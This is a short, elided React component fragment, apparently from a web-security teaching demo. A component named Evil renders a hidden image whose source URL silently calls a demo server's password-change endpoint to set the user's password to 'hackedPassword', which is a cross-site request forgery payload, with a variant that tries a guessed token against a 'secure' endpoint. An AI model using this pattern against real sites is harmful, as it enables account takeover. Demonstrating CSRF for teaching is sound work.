...
function Evil() {
    ...
    return (
        <>
            ...
            <img src={csrfOn === "on" ? `https://web2-security-server.onrender.com/changePassword/${username}/hackedPassword` : `https://web2-security-server.onrender.com/secureChangePassword/${username}/hackedPassword/tokenTry` } alt="trick"></img>
        </>
    )
